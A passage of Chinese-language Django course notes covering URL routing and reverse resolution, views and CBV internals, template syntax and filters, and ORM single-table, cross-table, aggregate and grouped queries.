    url(r'^testadd/$',views.testadd),
    # 尾页(了解)
    url(r'',views.error),
]
```

### 11-2 无名分组

```python
"""
分组:就是给某一段正则表达式用小括号扩起来
"""
url(r'^test/(\d+)/',views.test)

def test(request,xx):
    print(xx)
    return HttpResponse('test')
  
# 无名分组就是将括号内正则表达式匹配到的内容当作位置参数传递给后面的视图函数
```

### 11-3 有名分组

```Python
"""
可以给正则表达式起一个别名
"""
url(r'^testadd/(?P<year>\d+)',views.testadd)

def testadd(request,year):
    print(year)
    return HttpResponse('testadd')

# 有名分组就是将括号内正则表达式匹配到的内容当作关键字参数传递给后面的视图函数
```

### 11-4 无名有名是否可以混用

```python
"""
嘻嘻 不能混用
但是同一个分组可以使用N多次
"""

# 单个的分组可以使用多次
url(r'^index/(\d+)/(\d+)/(\d+)/',views.index),
url(r'^index/(?P<year>\d+)/(?P<age>\d+)/(?P<month>\d+)/',views.index),
```

### 11-5 反向解析

```python
"""
本质:通过一些方法得到一个结果 该结果可以访问到对应的url从而触发视图函数的运行
"""
# 最简单的情况 url第一个参数里面没有正则符号
	url(r'^index/',view.index,name='xxx')
# 前端
	{% url 'xxx' %}
# 后端
	from django.shortcuts import reverse
  reverse('xxx')
"""
别名不能出现冲突!!!
"""
```

### 11-6 无名分组反向解析

```python
# 无名分组反向解析
	url(r'^index/(\d+)/',views.index,name='xxx')

# 前端
	{% url 'xxx' 123 %}
# 后端
	reverse('xxx', args=(1,))

"""
这个数字写代码的时候应该放什么
	数字一般情况下放的是数据的主键值  数据的编辑和删除
	url(r'^edit/(\d+)/',views.edit,name='xxx')
	
	def edit(request,edit_id):
		reverse('xxx',args=(edit_id,))
		
	{%for user_obj in user_queryset%}
		<a href="{% url 'xxx' user_obj.id %}">编辑</a>
	{%endfor%}

今天每个人都必须完成的作业(*******)
	利用无名有名 反向解析 完成数据的增删改查
"""
```

### 11-7 有名分组的反向解析

```python
# 有名分组反向解析
   url(r'^func/(?P<year>\d+)/',views.func,name='ooo')
# 前端
	<a href="{% url 'ooo' year=123 %}">111</a>  了解
	<a href="{% url 'ooo' 123 %}">222</a>  			记忆

# 后端	
	 # 有名分组反向解析 写法1  了解
   print(reverse('ooo',kwargs={'year':123}))
   # 简便的写法  减少你的脑容量消耗 记跟无名一样的操作即可
   print(reverse('ooo',args=(111,)))
```

### 11-8 路由分发

```Python
"""
django的每一个应用都可以有自己的templates文件夹 urls.py static文件夹
正是基于上述的特点 django能够非常好的做到分组开发(每个人只写自己的app)
作为组长 只需要将手下书写的app全部拷贝到一个新的django项目中 然后在配置文件里面注册所有的app再利用路由分发的特点将所有的app整合起来

当一个django项目中的url特别多的时候 总路由urls.py代码非常冗余不好维护
这个时候也可以利用路由分发来减轻总路由的压力

利用路由分发之后 总路由不再干路由与视图函数的直接对应关系
而是做一个分发处理
	识别当前url是属于哪个应用下的 直接分发给对应的应用去处理
	
"""


# 总路由
from app01 import urls as app01_urls
from app02 import urls as app02_urls
urlpatterns = [
    url(r'^admin/', admin.site.urls),
    # 1.路由分发
    url(r'^app01/',include(app01_urls)),  # 只要url前缀是app01开头 全部交给app01处理
    url(r'^app02/',include(app02_urls))   # 只要url前缀是app02开头 全部交给app02处理
  
    # 2.终极写法  推荐使用
    url(r'^app01/',include('app01.urls')),
    url(r'^app02/',include('app02.urls'))
    # 注意事项:总路由里面的url千万不能加$结尾
]

# 子路由
	# app01 urls.py
  from django.conf.urls import url
  from app01 import views

  urlpatterns = [
      url(r'^reg/',views.reg)
  ]
  # app02 urls.py
  from django.conf.urls import url
  from app02 import views

  urlpatterns = [
      url(r'^reg/',views.reg)
  ]
```

### 11-9 命名空间

```python
# 当多个应用出现了相同的别名 我们研究反向解析会不会自动识别应用前缀
"""
正常情况下的反向解析是没有办法自动识别前缀的
"""

# 名称空间
	# 总路由
    url(r'^app01/',include('app01.urls',namespace='app01')),
    url(r'^app02/',include('app02.urls',namespace='app02'))
  # 解析的时候
  	# app01
  	urlpatterns = [
    url(r'^reg/',views.reg,name='reg')
		]
    # app02
    urlpatterns = [
    url(r'^reg/',views.reg,name='reg')
		]
    ## 后端反向解析
  	reverse('app01:reg')
    reverse('app02:reg')
    
    ## 前端反向解析
    {% url 'app01:reg' %}
    {% url 'app02:reg' %}
# 其实只要保证名字不冲突 就没有必要使用名称空间
"""
一般情况下 有多个app的时候我们在起别名的时候会加上app的前缀
这样的话就能够确保多个app之间名字不冲突的问题
"""
urlpatterns = [
    url(r'^reg/',views.reg,name='app01_reg')
]
urlpatterns = [
    url(r'^reg/',views.reg,name='app02_reg')
]
```

### 11-10 伪静态

```python
"""
静态网页
	数据是写死的 万年不变
	
伪静态
	将一个动态网页伪装成静态网页
	
	为什么要伪装呢？
		https://www.cnblogs.com/Dominic-Ji/p/9234099.html
		伪装的目的在于增大本网站的seo查询力度
		并且增加搜索引擎收藏本网上的概率
	
	搜索引擎本质上就是一个巨大的爬虫程序
	
	总结:
		无论你怎么优化 怎么处理
		始终还是干不过RMB玩家
"""
urlpatterns = [
    url(r'^reg.html',views.reg,name='app02_reg')
]
```

## 12-12 django版本区别

```python
1.django1.X路由层使用的是url方法
	而在django2.Xhe3.X版本中路由层使用的是path方法
	url()第一个参数支持正则
	path()第一个参数是不支持正则的 写什么就匹配什么
	
	
	如果你习惯使用path那么也给你提供了另外一个方法
		from django.urls import path, re_path
		from django.conf.urls import url
		
		re_path(r'^index/',index),
    url(r'^login/',login)
  2.X和3.X里面的re_path就等价于1.X里面的url
 
 
2.虽然path不支持正则 但是它的内部支持五种转换器
	path('index/<int:id>/',index)
	# 将第二个路由里面的内容先转成整型然后以关键字的形式传递给后面的视图函数

	def index(request,id):
    print(id,type(id))
    return HttpResponse('index')
    
  
  
str,匹配除了路径分隔符（/）之外的非空字符串，这是默认的形式
int,匹配正整数，包含0。
slug,匹配字母、数字以及横杠、下划线组成的字符串。
uuid,匹配格式化的uuid，如 075194d3-6885-417e-a8a8-6c931e272f00。
path,匹配任何非空字符串，包含了路径分隔符（/）（不能用？）
	
3.除了有默认的五个转换器之外 还支持自定义转换器(了解)
class MonthConverter:
    regex='\d{2}' # 属性名必须为regex

    def to_python(self, value):
        return int(value)

    def to_url(self, value):
        return value # 匹配的regex是两个数字，返回的结果也必须是两个数字
	
	
from django.urls import path,register_converter
from app01.path_converts import MonthConverter

# 先注册转换器
register_converter(MonthConverter,'mon')

from app01 import views


urlpatterns = [
    path('articles/<int:year>/<mon:month>/<slug:other>/', 	views.article_detail, name='aaa'),

]


4.模型层里面1.X外键默认都是级联更新删除的
但是到了2.X和3.X中需要你自己手动配置参数
	models.ForeignKey(to='Publish')
	
els.ForeignKey(to='Publish',on_delete=models.CASCADE...)
"""
```

## 12-13 视图层

### 13-1 三板斧

```python
"""
HttpResponse
	返回字符串类型
render
	返回html页面 并且在返回给浏览器之前还可以给html文件传值
redirect
	重定向
"""
# 视图函数必须要返回一个HttpResponse对象  正确   研究三者的源码即可得处结论
The view app01.views.index didn't return an HttpResponse object. It returned None instead.

# render简单内部原理
	from django.template import Template,Context
    res = Template('<h1>{{ user }}</h1>')
    con = Context({'user':{'username':'jason','password':123}})
    ret = res.render(con)
    print(ret)
    return HttpResponse(ret)
```

### 13-2 JsonResponse对象

```python
"""
json格式的数据有什么用？
	前后端数据交互需要使用到json作为过渡 实现跨语言传输数据

前端序列化
	JSON.stringify()					json.dumps()
	JSON.parse()							json.loads()
"""
import json
from django.http import JsonResponse
def ab_json(request):
    user_dict = {'username':'jason好帅哦,我好喜欢!','password':'123','hobby':'girl'}

    l = [111,222,333,444,555]
    # 先转成json格式字符串
    # json_str = json.dumps(user_dict,ensure_ascii=False)
    # 将该字符串返回
    # return HttpResponse(json_str)
    # 读源码掌握用法
    # return JsonResponse(user_dict,json_dumps_params={'ensure_ascii':False})
    # In order to allow non-dict objects to be serialized set the safe parameter to False.
    # return JsonResponse(l,safe=False)  
    # 默认只能序列化字典 序列化其他需要加safe参数	
```

### 13-3 form表单上传文件及后端如何操作

```python
"""
form表单上传文件类型的数据
	1.method必须指定成post
	2.enctype必须换成formdata

"""
def ab_file(request):
    if request.method == 'POST':
        # print(request.POST)  # 只能获取普通的键值对数据 文件不行
        print(request.FILES)  # 获取文件数据
        # <MultiValueDict: {'file': [<InMemoryUploadedFile: u=1288812541,1979816195&fm=26&gp=0.jpg (image/jpeg)>]}>
        file_obj = request.FILES.get('file')  # 文件对象
        print(file_obj.name)
        with open(file_obj.name,'wb') as f:
            for line in file_obj.chunks():  # 推荐加上chunks方法 其实跟不加是一样的都是一行行的读取
                f.write(line)

    return render(request,'form.html')
```

### 13-4 request对象方法

```python
"""
request.method
request.POST
request.GET
request.FILES
request.body  # 原生的浏览器发过来的二进制数据  后面详细的讲
request.path 
request.path_info
request.get_full_path()  能过获取完整的url及问号后面的参数 
"""
    print(request.path)  # /app01/ab_file/
    print(request.path_info)  # /app01/ab_file/
    print(request.get_full_path())  # /app01/ab_file/?username=jason
```

### 13-5 FBV与CBV

```python
# 视图函数既可以是函数也可以是类
def index(request):
  return HttpResponse('index')

# CBV
    # CBV路由
    url(r'^login/',views.MyLogin.as_view())


from django.views import View
class MyLogin(View):
    def get(self,request):
    	return render(request,'form.html')

    def post(self,request):
        return HttpResponse('post方法')
      
"""
FBV和CBV各有千秋
CBV特点
	能够直接根据请求方式的不同直接匹配到对应的方法执行
	
	内部到底是怎么实现的？
		CBV内部源码(******)
"""
```

### 13-6 CBV源码分析

```Python
# 你自己不要修改源码 出bug很难找

# 突破口在urls.py
url(r'^login/',views.MyLogin.as_view())
# url(r'^login/',views.view)  FBV一模一样
# CBV与FBV在路由匹配上本质是一样的 都是路由 对应 函数内存地址
"""
函数名/方法名 加括号执行优先级最高
猜测
    as_view()
        要么是被@staicmethod修饰的静态方法
        要么是被@classmethod修饰的类方法  正确
        
    @classonlymethod
    def as_view(cls, **initkwargs):
        pass
"""

    @classonlymethod
    def as_view(cls, **initkwargs):
        """
        cls就是我们自己写的类   MyCBV
        Main entry point for a request-response process.
        """
        def view(request, *args, **kwargs):
            self = cls(**initkwargs)  # cls是我们自己写的类
            # self = MyLogin(**initkwargs)  产生一个我们自己写的类的对象
            return self.dispatch(request, *args, **kwargs)
            """
            以后你们会经常需要看源码 但是在看python源码的时候 一定要时刻提醒自己面向对象属性方法查找顺序
                先从对象自己找
                再去产生对象的类里面找
                之后再去父类找
                ...
            总结:看源码只要看到了self点一个东西 一定要问你自己当前这个self到底是谁
            """
        return view
      
		# CBV的精髓
    def dispatch(self, request, *args, **kwargs):
        # 获取当前请求的小写格式 然后比对当前请求方式是否合法
        # get请求为例
        # post请求
        if request.method.lower() in self.http_method_names:
            handler = getattr(self, request.method.lower(), self.http_method_not_allowed)
            """
            反射:通过字符串来操作对象的属性或者方法
                handler = getattr(自己写的类产生的对象,'get',当找不到get属性或者方法的时候就会用第三个参数)
                handler = 我们自己写的类里面的get方法
            """
        else:
            handler = self.http_method_not_allowed
        return handler(request, *args, **kwargs)
        """
        自动调用get方法
        """

# 要求掌握到不看源码也能够描述出CBV的内部执行流程(******)
```

## 12-14 模板层

### 14-1 模版语法传值

{{}}:变量相关

{%%}:逻辑相关

```python
def index(request):
    # 模版语法可以传递的后端python数据类型
    n = 123
    f = 11.11
    s = '我也想奔现'
    b = True
    l = ['小红','姗姗','花花','茹茹']
    t = (111,222,333,444)
    d = {'username':'jason','age':18,'info':'这个人有点意思'}
    se = {'晶晶','洋洋','嘤嘤'}

    def func():
        print('我被执行了')
        return '你的另一半在等你'

    class MyClass(object):
        def get_self(self):
            return 'self'

        @staticmethod
        def get_func():
            return 'func'

        @classmethod
        def get_class(cls):
            return 'cls'
        
        # 对象被展示到html页面上 就类似于执行了打印操作也会触发__str__方法
        def __str__(self):
            return '到底会不会？'  
        
    obj = MyClass()

    # return render(request,'index.html',{})  # 一个个传
    return render(request,'index.html',locals())


<p>{{ n }}</p>
<p>{{ f }}</p>
<p>{{ s }}</p>
<p>{{ b }}</p>
<p>{{ l }}</p>
<p>{{ d }}</p>
<p>{{ t }}</p>
<p>{{ se }}</p>
<p>传递函数名会自动加括号调用 但是模版语法不支持给函数传额外的参数:{{ func }}</p>
<p>传类名的时候也会自动加括号调用(实例化){{ MyClass }}</p>
<p>内部能够自动判断出当前的变量名是否可以加括号调用 如果可以就会自动执行  针对的是函数名和类名</p>
<p>{{ obj }}</p>
<p>{{ obj.get_self }}</p>
<p>{{ obj.get_func }}</p>
<p>{{ obj.get_class }}</p>


# django模版语法的取值 是固定的格式 只能采用“句点符” .
<p>{{ d.username }}</p>
<p>{{ l.0 }}</p>
<p>{{ d.hobby.3.info }}</p>
# 即可以点键也可以点索引 还可以两者混
```

### 14-2 过滤器

```python 
# 过滤器就类似于是模版语法内置的 内置方法
# django内置有60多个过滤器 我们不需要学这么多 了解10个左右就差不多了 后面碰到了再去记忆



# 基本语法
{{数据|过滤器:参数}}

# 转义
# 前端
	|safe
# 后端
from django.utils.safestring import mark_safe
 res = mark_safe('<h1>新新</h1>')
"""
以后你在全栈项目的时候 前端代码不一定非要在前端页面书写
也可以现在先在后端写好 然后传递给前端页面
"""


<h1>过滤器</h1>
<p>统计长度:{{ s|length }}</p>
<p>默认值(第一个参数布尔值是True就展示第一个参数的值否在展示冒号后面的值):{{ b|default:'啥也不是' }}</p>
<p>文件大小:{{ file_size|filesizeformat }}</p>
<p>日期格式化:{{ current_time|date:'Y-m-d H:i:s' }}</p>
<p>切片操作(支持步长):{{ l|slice:'0:4:2' }}</p>
<p>切取字符(包含三个点):{{ info|truncatechars:9 }}</p>
<p>切取单词(不包含三个点 按照空格切):{{ egl|truncatewords:9 }}</p>
<p>切取单词(不包含三个点 按照空格切):{{ info|truncatewords:9 }}</p>
<p>移除特定的字符:{{ msg|cut:' ' }}</p>
<p>拼接操作:{{ l|join:'$' }}</p>
<p>拼接操作(加法):{{ n|add:10 }}</p>
<p>拼接操作(加法):{{ s|add:msg }}</p>
<p>取消转义:{{ hhh|safe }}</p>  ## 取消对html标签的转义
<p>转义:{{ sss|safe }}</p>
<p>转义:{{ res }}</p>
```

### 14-3 标签

```python
# for循环
	{% for foo in l %}
    <p>{{ forloop }}</p>
    <p>{{ foo }}</p>  一个个元素
	{% endfor %}
  {'parentloop': {}, 'counter0': 0, 'counter': 1, 'revcounter': 6, 'revcounter0': 5, 'first': True, 'last': False}

# if判断
{% if b %}
    <p>baby</p>
{% elif s%}
    <p>都来把</p>
{% else %}
    <p>老baby</p>
{% endif %}


# for与if混合使用
{% for foo in lll %}
    {% if forloop.first %}
        <p>这是我的第一次</p>
    {% elif forloop.last %}
        <p>这是最后一次啊</p>
    {% else %}
        <p>{{ foo }}</p>
    {% endif %}
    {% empty %}
        <p>for循环的可迭代对象内部没有元素 根本没法循环</p>
{% endfor %}
s
# 处理字典其他方法
{% for foo in d.keys %}
    <p>{{ foo }}</p>
{% endfor %}
{% for foo in d.values %}
    <p>{{ foo }}</p>
{% endfor %}
{% for foo in d.items %}
    <p>{{ foo }}</p>
{% endfor %}


# with起别名
{% with d.hobby.3.info as nb  %}
    <p>{{ nb }}</p>
    在with语法内就可以通过as后面的别名快速的使用到前面非常复杂获取数据的方式
    <p>{{ d.hobby.3.info }}</p>
{% endwith %}
```

### 14-4 自定义过滤器、标签、inclusion_tag

```python
"""
先三步走
	1.在应用下创建一个名字”必须“叫templatetags文件夹
	2.在该文件夹内创建“任意”名称的py文件 eg:mytag.py
	3.在该py文件内"必须"先书写下面两句话(单词一个都不能错)
		from django import template
		
		register = template.Library()
"""

# 自定义过滤器
@register.filter(name='baby')
def my_sum(v1, v2):
    return v1 + v2
# 使用
{% load mytag %}
<p>{{ n|baby:666 }}</p>


# 自定义标签(参数可以有多个)			类似于自定义函数
@register.simple_tag(name='plus')
def index(a,b,c,d):
    return '%s-%s-%s-%s'%(a,b,c,d)
# 使用
标签多个参数彼此之间空格隔开
<p>{% plus 'jason' 123 123 123 %}</p>


# 自定义inclusion_tag
"""
内部原理
	先定义一个方法 
	在页面上调用该方法 并且可以传值
	该方法会生成一些数据然后传递给一个html页面
	之后将渲染好的结果放到调用的位置
"""
@register.inclusion_tag('left_menu.html')
def left(n):
    data = ['第{}项'.format(i) for i in range(n)]
    # 第一种
    # return {'data':data}  # 将data传递给left_menu.html
    # 第二种
    return locals()  # 将data传递给left_menu.html
  
{% left 5 %}
# 总结:当html页面某一个地方的页面需要传参数才能够动态的渲染出来，并且在多个页面上都需要使用到该局部 那么就考虑将该局部页面做成inclusion_tag形式
(在讲bbs的时候会使用到)
```

### 14-5 模板的继承

```Python
"""
你们有没有见过一些网站
	这些网站页面整体都大差不差 只是某一些局部在做变化	
"""
# 模版的继承 你自己先选好一个你要想继承的模版页面
{% extends 'home.html' %}

# 继承了之后子页面跟模版页面长的是一模一样的 你需要在模版页面上提前划定可以被修改的区域
{% block content %}
	模版内容
{% endblock %}

# 子页面就可以声明想要修改哪块划定了的区域
{% block content %}
	子页面内容	
{% endblock %}


# 一般情况下模版页面上应该至少有三块可以被修改的区域
	1.css区域
  2.html区域
  3.js区域
  {% block css %}

  {% endblock %}
  
  {% block content %}

  {% endblock %}
  
  {% block js %}

  {% endblock %}
  # 每一个子页面就都可以有自己独有的css代码 html代码 js代码
  
"""
一般情况下 模版的页面上划定的区域越多 那么该模版的扩展性就越高
但是如果太多 那还不如自己直接写
"""
```

模版的导入

```
{% include '模版文件名' %}
```



## 12-15 模型层

### 15-1 单表操作

#### 15-1-1 增

```python
# django自带的sqlite3数据库对日期格式不是很敏感 处理的时候容易出错
# 增
    res = models.User.objects.create(name='jason',age=18,register_time='2002-1-21')
    print(res)
    
    import datetime
    ctime = datetime.datetime.now()
    user_obj = models.User(name='egon',age=84,register_time=ctime)
    user_obj.save()
```

#### 15-1-2 删

```Python
# 删
    res = models.User.objects.filter(pk=2).delete()
    print(res)
    """
    pk会自动查找到当前表的主键字段 指代的就是当前表的主键字段
    用了pk之后 你就不需要指代当前表的主键字段到底叫什么了
        uid
        pid
        sid
        ...
    """
    ## 先拿到当前用户对象
    user_obj = models.User.objects.filter(pk=1).first()
    ## 再对这个用户对象进行删除
    user_obj.delete()
```

#### 15-1-3 修改

```Python
# 修改
    models.User.objects.filter(pk=4).update(name='egonDSB')

    ## 直接拿到当前数据对象，但是该方法不推荐使用，如果数据不存在则直接报错
    user_obj = models.User.objects.get(pk=4)
    user_obj = models.User.objects.filter(pk=6)
    """
    get方法返回的直接就是当前数据对象
    但是该方法不推荐使用
        一旦数据不存在该方法会直接报错
        而filter则不会
            所以我们还是用filter
    """
    user_obj.name = 'egonPPP'
    user_obj.save()
```

### 15-2 必知必会13条

```python
# 必知必会13条
    1.all()  ## 查询所有数据

    2.filter()     ## 带有过滤条件的查询
    3.get()        ## 直接拿数据对象 但是条件不存在直接报错
    4.first()      ## 拿queryset里面第一个元素
        res = models.User.objects.all().first()
        print(res)
        
    5.last()
        res = models.User.objects.all().last()
        print(res)

    6.values()  ## 可以指定获取的数据字段  select name,age from ...     列表套字典
        res = models.User.objects.values('name','age')  
        # <QuerySet [{'name': 'jason', 'age': 18}, {'name': 'egonPPP', 'age': 84}]>
        print(res)
    
    7.values_list()  ## 列表套元祖
        res = models.User.objects.values_list('name','age')  
        # <QuerySet [('jason', 18), ('egonPPP', 84)]>
        print(res)
     """
     查看内部封装的sql语句
     上述查看sql语句的方式  只能用于queryset对象
     只有queryset对象才能够点击query查看内部的sql语句
    """
    8.distinct()  ## 去重
        res = models.User.objects.values('name','age').distinct()
        print(res)
    """
    去重一定要是一模一样的数据
    如果带有主键那么肯定不一样 你在往后的查询中一定不要忽略主键
    """
    9.order_by()
        res = models.User.objects.order_by('age')  # 默认升序
        res = models.User.objects.order_by('-age')  # 降序
  	    print(res)
    10.reverse()  ## 反转的前提是 数据已经排过序了  order_by()
        res = models.User.objects.all()
        res1 = models.User.objects.order_by('age').reverse()
        print(res,res1)

    11.count()  ## 统计当前数据的个数
        res = models.User.objects.count()
        print(res)
        
    12.exclude()  ## 排除在外
        res = models.User.objects.exclude(name='jason')
        print(res)

    13.exists()  ## 基本用不到因为数据本身就自带布尔值  返回的是布尔值
        res = models.User.objects.filter(pk=10).exists()
        print(res)
```

### 15-3 查看内部sql语句的方式

```python
# 方式1
res = models.User.objects.values_list('name','age')  # <QuerySet [('jason', 18), ('egonPPP', 84)]>
print(res.query)
queryset对象才能够点击query查看内部的sql语句

# 方式2:所有的sql语句都能查看
# 去配置文件中配置一下即可
LOGGING = {
    'version': 1,
    'disable_existing_loggers': False,
    'handlers': {
        'console':{
            'level':'DEBUG',
            'class':'logging.StreamHandler',
        },
    },
    'loggers': {
        'django.db.backends': {
            'handlers': ['console'],
            'propagate': True,
            'level':'DEBUG',
        },
    }
}
```

### 15-4 测试脚本

```python
"""
当你只是想测试django中的某一个py文件内容 那么你可以不用书写前后端交互的形式
而是直接写一个测试脚本即可

脚本代码无论是写在应用下的tests.py还是自己单独开设py文件都可以
"""
# 测试环境的准备 去manage.py中拷贝前四行代码 然后自己写两行
import os
import sys

if __name__ == "__main__":
    os.environ.setdefault("DJANGO_SETTINGS_MODULE", "day64.settings")
    import django
    django.setup()
    # 在这个代码块的下面就可以测试django里面的单个py文件了
```

### 15-5 神奇的双下划线查询

```python
## 神奇的双下划线查询
    # 年龄大于35岁的数据
        res = models.User.objects.filter(age__gt=35)
        print(res)
    # 年龄小于35岁的数据
        res = models.User.objects.filter(age__lt=35)
        print(res)
        
    ## 大于等于 小于等于
        res = models.User.objects.filter(age__gte=32)
        print(res)
        res = models.User.objects.filter(age__lte=32)
        print(res)

    ## 年龄是18 或者 32 或者40
        res = models.User.objects.filter(age__in=[18,32,40])
        print(res)

    ## 年龄在18到40岁之间的  首尾都要
        res = models.User.objects.filter(age__range=[18,40])
        print(res)

    ## 查询出名字里面含有s的数据  模糊查询
        res = models.User.objects.filter(name__contains='s')
        print(res)

    ## 是否区分大小写  查询出名字里面含有p的数据  区分大小写
        res = models.User.objects.filter(name__contains='p')
        print(res)
        
    ## 忽略大小写
        res = models.User.objects.filter(name__icontains='p')
        print(res)

    ## 以..开头 以...结尾
        res = models.User.objects.filter(name__startswith='j')
        res1 = models.User.objects.filter(name__endswith='j')
    	print(res,res1)

    ## 查询出注册时间是 2020 1月
        res = models.User.objects.filter(register_time__month='1')
        res = models.User.objects.filter(register_time__year='2020')
```

### 15-6 案例表创建

```python
class Book(models.Model):
	title = models.CharField(max_length=32)
	price = models.DecimalField(max_digits=8,decimal_places=2)
	publish_date = models.DateField(auto_now_add=True)

	## 一对多
	publish = models.ForeignKey(to='Publish')
	## 多对多
	authors = models.ManyToManyField(to='Author')


class Publish(models.Model):
	name = models.CharField(max_length=32)
	addr = models.CharField(max_length=64)
	email = models.EmailField() ## 本质是varchar

class Author(models.Model):
	name = models.CharField(max_length=32)
	age = models.IntegerField()

	## 一对一
	author_detail = models.OneToOneField(to='AuthorDetail')

class AuthorDetail(models.Model):
	phone = models.BigIntegerField()
	addr = models.CharField(max_length=64)

```



### 15-7 一对多外键增删改查

```python
## 一对多外键增删改查
    ## 增
    ## 1  直接写实际字段 id
        models.Book.objects.create(title='论语',price=899.23,publish_id=1)
        models.Book.objects.create(title='聊斋',price=444.23,publish_id=2)
        models.Book.objects.create(title='老子',price=333.66,publish_id=1)
    ## 2  虚拟字段 对象
        publish_obj = models.Publish.objects.filter(pk=2).first()
        models.Book.objects.create(title='红楼梦',price=666.23,publish=publish_obj)

    ## 删
    	models.Publish.objects.filter(pk=1).delete()  # 级联删除

    ## 修改
        models.Book.objects.filter(pk=1).update(publish_id=2)
        publish_obj = models.Publish.objects.filter(pk=1).first()
        models.Book.objects.filter(pk=1).update(publish=publish_obj)
```

### 15-8 多对多外键增删改查

```python
# 如何给书籍添加作者？
	book_obj = models.Book.objects.filter(pk=1).first()
    print(book_obj.authors)  # 就类似于你已经到了第三张关系表了
    
    book_obj.authors.add(1)  # 书籍id为1的书籍绑定一个主键为1 的作者
    book_obj.authors.add(2,3)

    author_obj = models.Author.objects.filter(pk=1).first()
    author_obj1 = models.Author.objects.filter(pk=2).first()
    author_obj2 = models.Author.objects.filter(pk=3).first()
    book_obj.authors.add(author_obj)
    book_obj.authors.add(author_obj1,author_obj2)
"""
add给第三张关系表添加数据
	括号内既可以传数字也可以传对象 并且都支持多个
"""

# 删
    book_obj.authors.remove(2)
    book_obj.authors.remove(1,3)

    author_obj = models.Author.objects.filter(pk=2).first()
    author_obj1 = models.Author.objects.filter(pk=3).first()
    book_obj.authors.remove(author_obj,author_obj1)
    """
    remove
        括号内既可以传数字也可以传对象 并且都支持多个
    """

## 修改
    book_obj.authors.set([1,2])  # 括号内必须给一个可迭代对象
    book_obj.authors.set([3])  # 括号内必须给一个可迭代对象

    author_obj = models.Author.objects.filter(pk=2).first()
    author_obj1 = models.Author.objects.filter(pk=3).first()
    book_obj.authors.set([author_obj,author_obj1])  # 括号内必须给一个可迭代对象

    """
    set
        括号内必须传一个可迭代对象，该对象内既可以数字也可以对象 并且都支持多个
    """

## 清空
## 在第三张关系表中清空某个书籍与作者的绑定关系
	book_obj.authors.clear()
    """
    clear
        括号内不要加任何参数

```

### 15-9 正反向的概念

```python
# 正向
# 反向
	外键字段在我手上那么，我查你就是正向
  外键字段如果不在手上，我查你就是反向
  
  book >>>外键字段在书那儿(正向)>>> publish
  publish	>>>外键字段在书那儿(反向)>>>book
  
  一对一和多对多正反向的判断也是如此
  
"""
正向查询按字段
反向查询按表名小写
				_set
				...
"""
```

### 15-10 多表查询

#### 10-1 子查询(基于对象的跨表查询)

```python
1.查询书籍主键为1的出版社
book_obj = models.Book.objects.filter(pk=1).first()
## 书查出版社 正向
res = book_obj.publish
print(res)
print(res.name)
print(res.addr)

2.查询书籍主键为2的作者
book_obj = models.Book.objects.filter(pk=2).first()
# # 书查作者 正向
res = book_obj.authors  # app01.Author.None
res = book_obj.authors.all()  
# <QuerySet [<Author: Author object>, <Author: Author object>]>
print(res)

3.查询作者jason的电话号码
author_obj = models.Author.objects.filter(name='jason').first()
res = author_obj.author_detail
print(res)
print(res.phone)
print(res.addr)

"""
在书写orm语句的时候跟写sql语句一样的
不要企图一次性将orm语句写完 如果比较复杂 就写一点看一点

正向什么时候需要加.all()
	当你的结果可能有多个的时候就需要加.all()
	如果是一个则直接拿到数据对象
		book_obj.publish
		book_obj.authors.all()
		author_obj.author_detail
"""
4.查询出版社是东方出版社出版的书
publish_obj = models.Publish.objects.filter(name='东方出版社').first()
出版社查书  反向
res = publish_obj.book_set  # app01.Book.None
res = publish_obj.book_set.all()
print(res)

5.查询作者是jason写过的书
author_obj = models.Author.objects.filter(name='jason').first()
# 作者查书      反向
res = author_obj.book_set  # app01.Book.None
res = author_obj.book_set.all()
print(res)

6.查询手机号是110的作者姓名
author_detail_obj = models.AuthorDetail.objects.filter(phone=110).first()
res = author_detail_obj.author
print(res.name)
"""
基于对象 
	反向查询的时候
		当你的查询结果可以有多个的时候 就必须加_set.all()
		当你的结果只有一个的时候 不需要加_set.all()
	自己总结出 自己方便记忆的即可 每个人都可以不一样
"""
```

#### 10-2 联表查询(基于双下划线的跨表查询)

```Python
# 基于双下划线的跨表查询


    1.查询jason的手机号和作者姓名
    res = models.Author.objects.filter(name='jason').values('author_detail__phone','name')
    print(res)
    # 反向
    res = models.AuthorDetail.objects.filter(author__name='jason')  # 拿作者姓名是jason的作者详情
    res = models.AuthorDetail.objects.filter(author__name='jason').values('phone','author__name')
    print(res)


    2.查询书籍主键为1的出版社名称和书的名称
    res = models.Book.objects.filter(pk=1).values('title','publish__name')
    print(res)
    反向
    res = models.Publish.objects.filter(book__id=1).values('name','book__title')
    print(res)

    3.查询书籍主键为1的作者姓名
    res = models.Book.objects.filter(pk=1).values('authors__name')
    print(res)
    ## 反向
    res = models.Author.objects.filter(book__id=1).values('name')
    print(res)


    查询书籍主键是1的作者的手机号
    book author authordetail
    res = models.Book.objects.filter(pk=1).values('authors__author_detail__phone')
    print(res)
    """
    你只要掌握了正反向的概念
    以及双下划线
    那么你就可以无限制的跨表
    """
```

### 15-11 聚合查询

```python
'''
	只要跟数据库相关的模块
	基本上都在django.db.models里面
	如果没有name应该在django.db里面
'''
from app01 import models
from django.db.models import  Max,Min,Sum,Count,Avg
# 统计所有数的平均价格
res = models.Book.objects.aggregate(Avg('price'))  ## 如果没有跟分组一起搭配使用，则加aggregate
print(res)

## 上述方法一次性使用
res = models.Book.objects.aggregate(Max('price'),Min('price'),Avg('price'),Sum('price'),Count('price'))
print(res)
```

### 15-12 分组查询

```python
## 分组查询   关键字 annotate
## 1，统计每一本书的作者个数
# res = models.Book.objects.annotate()  ## models后面点什么就按照什么分组
res = models.Book.objects.annotate(author_num=Count('authors__id')).values('title','author_num')
## models后面点什么就按照什么分组
print(res)
'''
aythor_num 是我们自己定义的字段，用来存储统计出来的每本书对应的作者个数
'''

## 2，统计每个出版社卖的最便宜的书的价格
res = models.Publish.objects.annotate(min_price=Min('book__price')).values('name','min_price')
print(res)

## 3,统计不止一个作者的图书
res = models.Book.objects.annotate(author_num=Count('authors__id')).filter(author_num__gt=1).values('title','author_num')
'''
只要是ORM查询的结果是一个queryset对象，则可以继续点这个对象封装的方法
'''
print(res)


## 4，查询每个作者出版的书的总价格
res = models.Author.objects.annotate(sum_price=Sum('book__price')).values('name','sum_price')
print(res)
'''
如果按照指定字段分组，应该如何做？
models.Book.objects.values('price').annotate()  ## 这时候就按照price分组了
'''
```

### 15-13 F查询

```Python
## F查询
'''
功能是帮助你直接获取到表中某个字段对应的数据
'''
# 1 查询卖出书大于库存数的书籍
from django.db.models import F
res = models.Book.objects.filter(maichu__gt=F('kucun')) ## F 可以拿出每一本书的库存
print(res)

